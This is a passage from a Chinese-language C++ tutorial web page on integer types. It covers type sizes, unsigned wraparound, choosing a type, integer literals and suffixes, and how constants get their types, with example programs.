<span class="string">&quot;long: &quot;</span> &lt;&lt; largeInteger &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;long long: &quot;</span> &lt;&lt; veryLargeInteger &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-3-整型short、int、long和long-long"><a href="#3-1-3-整型short、int、long和long-long" class="headerlink" title="3.1.3 整型short、int、long和long long"></a>3.1.3 整型short、int、long和long long</h3><p>C++标准规定了各种整型类型的最小尺寸（占用的内存位数），但具体尺寸可能因编译器和操作系统而异。</p><p><strong>标准规定的最小尺寸:</strong></p><ul><li>  <code>short</code>: 至少16位。</li><li>  <code>int</code>: 至少和 <code>short</code> 一样大，通常是系统处理效率最高的整数长度（例如，在32位系统上通常是32位，64位系统上可能是32位或64位）。</li><li>  <code>long</code>: 至少32位，且至少和 <code>int</code> 一样大。</li><li>  <code>long long</code>: 至少64位，且至少和 <code>long</code> 一样大。</li></ul><p><strong>如何查看具体尺寸:</strong></p><p>可以使用 <code>sizeof</code> 运算符来查看特定类型在你的系统上占用的字节数。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;climits&gt; // 包含整型限制信息 (如 INT_MAX)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用 sizeof 查看各种类型占用的字节数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of short: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">short</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of int: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">int</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of long: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">long</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of long long: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查看 int 类型的最大值 (需要 &lt;climits&gt;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Maximum value for int: &quot;</span> &lt;&lt; INT_MAX &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 类似地，有 SHRT_MAX, LONG_MAX, LLONG_MAX 等</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明和初始化</span></span><br><span class="line">    <span class="keyword">short</span> s_value = <span class="number">32767</span>; <span class="comment">// 通常是 short 的最大值 (如果 short 是 16 位)</span></span><br><span class="line">    <span class="keyword">int</span> i_value = <span class="number">2000000000</span>; </span><br><span class="line">    <span class="keyword">long</span> l_value = <span class="number">1000000000L</span>; <span class="comment">// L 后缀表示 long (可选，但有时有助于清晰)</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ll_value = <span class="number">50000000000L</span>L; <span class="comment">// LL 后缀表示 long long</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;short value: &quot;</span> &lt;&lt; s_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;int value: &quot;</span> &lt;&lt; i_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;long value: &quot;</span> &lt;&lt; l_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;long long value: &quot;</span> &lt;&lt; ll_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 溢出示例 (行为是未定义的或回绕)</span></span><br><span class="line">    <span class="keyword">short</span> max_short = SHRT_MAX;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Max short: &quot;</span> &lt;&lt; max_short &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    max_short = max_short + <span class="number">1</span>; <span class="comment">// 尝试超出最大值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Max short + 1: &quot;</span> &lt;&lt; max_short &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 可能变成负数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 当一个整数值超出了其类型所能表示的最大范围时，会发生<strong>溢出 (Overflow)**。对于有符号整数溢出，C++标准规定其行为是</strong>未定义的 (Undefined Behavior)**，这意味着任何事情都可能发生（程序崩溃、得到奇怪的结果等）。对于无符号整数溢出，行为是定义好的（通常是回绕，即从0重新开始）。</p><h3 id="3-1-4-无符号类型"><a href="#3-1-4-无符号类型" class="headerlink" title="3.1.4 无符号类型"></a>3.1.4 无符号类型</h3><p>对于每种整型（<code>short</code>, <code>int</code>, <code>long</code>, <code>long long</code>），都存在一个对应的<strong>无符号 (unsigned)</strong> 版本。无符号类型只能存储非负整数（0和正数）。</p><p>通过在类型名前加上 <code>unsigned</code> 关键字来声明无符号类型。</p><p><strong>特点:</strong></p><ul><li>  <strong>范围:</strong> 在相同的字节数下，无符号类型可以表示的最大值大约是有符号类型的两倍，因为它们不需要用一位来表示正负号。范围从 0 开始。</li><li>  <strong>用途:</strong> 当你知道一个变量永远不会是负数时（例如，计数器、数组索引、人口数量等），使用无符号类型可以增大其可表示的正数范围。</li><li>  <strong>回绕 (Wrap Around):</strong> 当无符号整数的值超出其最大范围时，它会从0重新开始（模运算）。例如，如果一个 <code>unsigned short</code> 的最大值是 65535，那么 <code>65535 + 1</code> 会变成 <code>0</code>。同样，<code>0 - 1</code> 会变成 <code>65535</code>。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;climits&gt; // 包含 UINT_MAX 等</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 声明无符号类型</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> us_value;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> ui_value;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ul_value;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ull_value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查看大小和范围</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of unsigned int: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Maximum value for unsigned int: &quot;</span> &lt;&lt; UINT_MAX &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 赋值</span></span><br><span class="line">    us_value = <span class="number">65535</span>; <span class="comment">// 通常是 unsigned short 的最大值 (如果 short 是 16 位)</span></span><br><span class="line">    ui_value = <span class="number">4000000000U</span>; <span class="comment">// U 后缀表示 unsigned int</span></span><br><span class="line">    ul_value = <span class="number">8000000000U</span>L; <span class="comment">// UL 后缀</span></span><br><span class="line">    ull_value = <span class="number">18000000000000000000U</span>LL; <span class="comment">// ULL 后缀</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;unsigned short: &quot;</span> &lt;&lt; us_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;unsigned int: &quot;</span> &lt;&lt; ui_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;unsigned long: &quot;</span> &lt;&lt; ul_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;unsigned long long: &quot;</span> &lt;&lt; ull_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 回绕示例</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> test_wrap = USHRT_MAX;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Max unsigned short: &quot;</span> &lt;&lt; test_wrap &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    test_wrap = test_wrap + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Max unsigned short + 1: &quot;</span> &lt;&lt; test_wrap &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 变为 0</span></span><br><span class="line"></span><br><span class="line">    test_wrap = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned short = 0&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    test_wrap = test_wrap - <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned short - 1: &quot;</span> &lt;&lt; test_wrap &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 变为 USHRT_MAX</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 混合使用有符号和无符号整数进行运算时要特别小心，因为有符号数可能会被隐式转换为无符号数，导致意外的结果，尤其是在比较运算中。</p><h3 id="3-1-5-选择整型类型"><a href="#3-1-5-选择整型类型" class="headerlink" title="3.1.5 选择整型类型"></a>3.1.5 选择整型类型</h3><p>在选择使用哪种整型类型时，应考虑以下因素：</p><ol><li> <strong>数值范围:</strong> 确保所选类型能够容纳你程序中需要存储的最大（和最小，如果是有符号）整数值。如果数值可能很大，优先考虑 <code>long</code> 或 <code>long long</code>。如果数值永远非负，可以考虑 <code>unsigned</code> 版本以获得更大的正数范围。</li><li> <strong>内存消耗:</strong> 如果内存非常宝贵（例如在嵌入式系统或处理大量数据时），并且确定数值范围较小，可以使用 <code>short</code> 来节省内存。</li><li> <strong>性能:</strong> <code>int</code> 通常被认为是计算机处理效率最高的整数类型。除非有明确的范围或内存需求，否则 <code>int</code> 是一个不错的默认选择。</li><li> <strong>可移植性:</strong> <code>int</code> 的大小可能因系统而异。如果需要确保在不同系统上具有固定的大小，可以使用 C++11 引入的固定宽度整数类型（在 <code>&lt;cstdint&gt;</code> 头文件中定义），例如 <code>int16_t</code>, <code>uint32_t</code>, <code>int64_t</code> 等。</li><li> <strong>代码清晰度:</strong> 选择最能自然表达意图的类型。如果变量代表一个永远不会为负的计数，<code>unsigned int</code> 可能比 <code>int</code> 更能表达这个意图。</li></ol><p><strong>一般建议:</strong></p><ul><li>  如果不需要存储负数，且需要更大的正数范围，或者变量逻辑上就是无符号的（如计数），使用 <code>unsigned</code>。</li><li>  如果数值范围不大，且没有特殊内存或性能要求，<code>int</code> 是最常用的选择。</li><li>  如果 <code>int</code> 可能不够大，使用 <code>long long</code>。<code>long</code> 在某些系统上可能和 <code>int</code> 大小相同，而 <code>long long</code> 保证至少64位。</li><li>  只有在内存非常受限且确定数值很小时才使用 <code>short</code>。</li><li>  为了明确性和跨平台兼容性，可以考虑使用 <code>&lt;cstdint&gt;</code> 中的固定宽度类型。</li></ul><p><strong>用法与示例 (选择):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdint&gt; // 包含固定宽度整数类型</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 场景 1: 存储学生年龄 (通常不大，非负)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> studentAge = <span class="number">20</span>; <span class="comment">// unsigned int 或 int 都可以，unsigned 更明确非负</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 场景 2: 循环计数器 (通常用 int)</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 场景 3: 存储文件大小 (可能非常大，非负)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fileSize = <span class="number">5000000000U</span>LL; <span class="comment">// 需要大范围，非负</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 场景 4: 需要精确 32 位有符号整数 (跨平台)</span></span><br><span class="line">    <span class="keyword">int32_t</span> preciseCounter = <span class="number">-123456789</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 场景 5: 内存受限，存储少量选项 (0-100)</span></span><br><span class="line">    <span class="comment">// short optionCode = 5; // 如果 short 足够且内存关键</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; studentAge &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;File Size: &quot;</span> &lt;&lt; fileSize &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Precise Counter: &quot;</span> &lt;&lt; preciseCounter &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-6-整型字面值"><a href="#3-1-6-整型字面值" class="headerlink" title="3.1.6 整型字面值"></a>3.1.6 整型字面值</h3><p><strong>整型字面值 (Integer Literal)</strong> 是直接写在代码中的整数常量，例如 <code>10</code>, <code>0</code>, <code>-5</code>, <code>42</code>。C++允许以不同的进制（基数）书写整型字面值：</p><ol><li> <strong>十进制 (Decimal):</strong> 最常见的形式，以非零数字开头（除非是数字0本身）。例如：<code>10</code>, <code>255</code>, <code>0</code>, <code>12345</code>。</li><li> <strong>八进制 (Octal):</strong> 以 <code>0</code> 开头。只包含数字 0-7。例如：<code>012</code> (等于十进制的 10)，<code>077</code> (等于十进制的 63)。现代C++中应谨慎使用，容易与十进制混淆。</li><li> <strong>十六进制 (Hexadecimal):</strong> 以 <code>0x</code> 或 <code>0X</code> 开头。包含数字 0-9 和字母 a-f (或 A-F)，大小写不敏感。例如：<code>0xA</code> (等于十进制的 10)，<code>0xFF</code> (等于十进制的 255)，<code>0x1a2b</code>。常用于表示内存地址或位模式。</li><li> <strong>二进制 (Binary) (C++14):</strong> 以 <code>0b</code> 或 <code>0B</code> 开头。只包含数字 0 和 1。例如：<code>0b1010</code> (等于十进制的 10)，<code>0b11111111</code> (等于十进制的 255)。</li></ol><p><strong>后缀 (Suffixes):</strong></p><p>可以通过在字面值后面添加后缀来显式指定其类型：</p><ul><li>  <code>u</code> 或 <code>U</code>: 表示 <code>unsigned</code> 类型 (<code>unsigned int</code>, <code>unsigned long</code>, <code>unsigned long long</code>)。</li><li>  <code>l</code> 或 <code>L</code>: 表示 <code>long</code> 或 <code>unsigned long</code> 类型。</li><li>  <code>ll</code> 或 <code>LL</code>: 表示 <code>long long</code> 或 <code>unsigned long long</code> 类型 (C++11)。</li></ul><p>后缀可以组合使用，例如 <code>ul</code>, <code>UL</code>, <code>ull</code>, <code>ULL</code>, <code>lu</code>, <code>llu</code> 等（顺序和大小写不重要）。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> decimal_val = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> octal_val = <span class="number">0144</span>;   <span class="comment">// 1*64 + 4*8 + 4*1 = 64 + 32 + 4 = 100 (十进制)</span></span><br><span class="line">    <span class="keyword">int</span> hex_val = <span class="number">0x64</span>;     <span class="comment">// 6*16 + 4*1 = 96 + 4 = 100 (十进制)</span></span><br><span class="line">    <span class="comment">// int binary_val = 0b1100100; // C++14: 64 + 32 + 4 = 100 (十进制)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Decimal: &quot;</span> &lt;&lt; decimal_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Octal (0144): &quot;</span> &lt;&lt; octal_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hexadecimal (0x64): &quot;</span> &lt;&lt; hex_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Binary (0b1100100): &quot; &lt;&lt; binary_val &lt;&lt; std::endl; // 需要 C++14 编译器</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用后缀</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> u_val = <span class="number">100U</span>;</span><br><span class="line">    <span class="keyword">long</span> l_val = <span class="number">200000L</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ul_val = <span class="number">300000U</span>L;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ll_val = <span class="number">4000000000L</span>L;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ull_val = <span class="number">5000000000U</span>LL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned int: &quot;</span> &lt;&lt; u_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Long: &quot;</span> &lt;&lt; l_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned long: &quot;</span> &lt;&lt; ul_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Long long: &quot;</span> &lt;&lt; ll_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned long long: &quot;</span> &lt;&lt; ull_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-7-C-如何确定常量的类型"><a href="#3-1-7-C-如何确定常量的类型" class="headerlink" title="3.1.7 C++如何确定常量的类型"></a>3.1.7 C++如何确定常量的类型</h3><p>当你写下一个整型字面值（常量）而没有指定后缀时，C++编译器会根据其值来推断其类型。</p><p><strong>规则:</strong></p><ol><li><strong>十进制常量:</strong> 编译器会选择能容纳该值的最小的有符号类型，依次尝试：<code>int</code>, <code>long</code>, <code>long long</code> (C++11)。例如：<ul><li>  <code>100</code> 会被认为是 <code>int</code> (如果 <code>int</code> 能容纳)。</li><li>  <code>3000000000</code> 会被认为是 <code>long</code> (如果 <code>int</code> 不能容纳但 <code>long</code> 可以)，或者 <code>long long</code> (如果 <code>int</code> 和 <code>long</code> 都不能容纳但 <code>long long</code> 可以)。</li></ul></li><li> <strong>八进制或十六进制常量:</strong> 编译器会选择能容纳该值的最小类型，依次尝试：<code>int</code>, <code>unsigned int</code>, <code>long</code>, <code>unsigned long</code>, <code>long long</code> (C++11), <code>unsigned long long</code> (C++11)。注意这里包含了 <code>unsigned</code> 类型。</li></ol><p><strong>为什么要知道这个?</strong></p><p>这在涉及类型转换和函数重载时可能很重要。如果你传递一个常量给函数，它的默认类型可能会影响哪个重载版本被调用。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;typeinfo&gt; // 用于 typeid (仅作演示)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing int: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing unsigned int: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">long</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing long: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span 